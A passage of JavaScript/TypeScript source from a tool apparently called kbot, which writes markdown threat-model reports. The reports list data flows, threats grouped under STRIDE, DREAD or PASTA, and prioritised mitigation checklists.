      const hasFileOps = files.some(f => /(?:upload|download|file|storage)/i.test(f.path))
      const hasPayments = files.some(f => /(?:stripe|payment|billing)/i.test(f.content))

      if (hasAuth) {
        lines.push('1. **Authentication Flow**: User -> Login Form -> API -> Auth Service -> JWT/Session -> Client')
      }
      if (hasApi) {
        lines.push('2. **API Request Flow**: Client -> API Gateway -> Auth Check -> Route Handler -> Database -> Response')
      }
      if (hasFileOps) {
        lines.push('3. **File Upload Flow**: Client -> Upload Endpoint -> Validation -> Storage -> CDN -> Serve')
      }
      if (hasPayments) {
        lines.push('4. **Payment Flow**: Client -> Checkout -> Payment Provider (Stripe) -> Webhook -> Order Update')
      }
      if (hasDb) {
        lines.push('5. **Data Flow**: User Input -> Validation -> Sanitization -> ORM/Query -> Database -> Response Serialization')
      }
      lines.push('')

      // Threats
      lines.push('---')
      lines.push('')
      lines.push('## Identified Threats')
      lines.push('')

      if (methodology === 'stride') {
        const categories = ['Spoofing', 'Tampering', 'Repudiation', 'Information Disclosure', 'Denial of Service', 'Elevation of Privilege']
        for (const cat of categories) {
          const catThreats = threats.filter(t => t.category === cat)
          lines.push(`### ${cat}`)
          lines.push('')
          if (catThreats.length === 0) {
            lines.push('_No specific threats identified for this category based on static analysis._')
            lines.push('')
          } else {
            for (const t of catThreats) {
              lines.push(`#### ${t.threat}`)
              lines.push('')
              lines.push(`**Severity**: ${t.severity.toUpperCase()}`)
              lines.push(`**Description**: ${t.description}`)
              if (t.affected.length > 0) {
                lines.push(`**Affected Components**: ${t.affected.slice(0, 5).map(a => `\`${a}\``).join(', ')}${t.affected.length > 5 ? ` +${t.affected.length - 5} more` : ''}`)
              }
              lines.push(`**Mitigation**: ${t.mitigation}`)
              lines.push('')
            }
          }
        }
      } else if (methodology === 'dread') {
        const sorted = threats.sort((a, b) => SEVERITY_SCORE[b.severity] - SEVERITY_SCORE[a.severity])
        for (const t of sorted) {
          lines.push(`### ${t.threat}`)
          lines.push('')
          lines.push(`**Category**: ${t.category}`)
          lines.push(`**Severity**: ${t.severity.toUpperCase()}`)
          lines.push(`**Description**: ${t.description}`)
          if (t.affected.length > 0) {
            lines.push(`**Affected Components**: ${t.affected.slice(0, 5).map(a => `\`${a}\``).join(', ')}`)
          }
          lines.push(`**Mitigation**: ${t.mitigation}`)
          lines.push('')
        }
      } else if (methodology === 'pasta') {
        for (const t of threats) {
          lines.push(`### ${t.threat}`)
          lines.push('')
          if (t.category.startsWith('PASTA Stage')) {
            lines.push(`**Stage**: ${t.category}`)
          } else {
            lines.push(`**Category**: ${t.category}`)
            lines.push(`**Severity**: ${t.severity.toUpperCase()}`)
          }
          lines.push(`**Description**: ${t.description}`)
          if (t.affected.length > 0 && t.affected[0] !== 'application-wide') {
            lines.push(`**Affected Components**: ${t.affected.slice(0, 5).map(a => `\`${a}\``).join(', ')}`)
          }
          lines.push(`**Mitigation**: ${t.mitigation}`)
          lines.push('')
        }
      }

      // Summary
      lines.push('---')
      lines.push('')
      lines.push('## Summary & Recommendations')
      lines.push('')
      lines.push(`Total threats identified: **${threats.length}**`)
      lines.push('')

      const criticalThreats = threats.filter(t => t.severity === 'critical')
      const highThreats = threats.filter(t => t.severity === 'high')
      const mediumThreats = threats.filter(t => t.severity === 'medium')

      if (criticalThreats.length > 0) {
        lines.push('### Immediate Actions Required')
        lines.push('')
        for (const t of criticalThreats) {
          lines.push(`- [ ] ${t.threat}: ${t.mitigation}`)
        }
        lines.push('')
      }

      if (highThreats.length > 0) {
        lines.push('### High Priority')
        lines.push('')
        for (const t of highThreats) {
          lines.push(`- [ ] ${t.threat}: ${t.mitigation}`)
        }
        lines.push('')
      }

      if (mediumThreats.length > 0) {
        lines.push('### Medium Priority')
        lines.push('')
        for (const t of mediumThreats.slice(0, 10)) {
          lines.push(`- [ ] ${t.threat}: ${t.mitigation}`)
        }
        lines.push('')
      }

      lines.push('### Ongoing')
      lines.push('')
      lines.push('- [ ] Implement automated security testing in CI/CD')
      lines.push('- [ ] Schedule regular threat model reviews (quarterly)')
      lines.push('- [ ] Conduct dynamic penetration testing annually')
      lines.push('- [ ] Monitor dependency vulnerabilities continuously')
      lines.push('- [ ] Review access controls after team changes')
      lines.push('')

      lines.push('---')
      lines.push('')
      lines.push(`_Threat model generated by kbot using ${methodology.toUpperCase()} methodology._`)
      lines.push('_This is based on static code analysis. Manual review and dynamic testing are recommended for complete coverage._')

      return lines.join('\n')
    },
  })
}
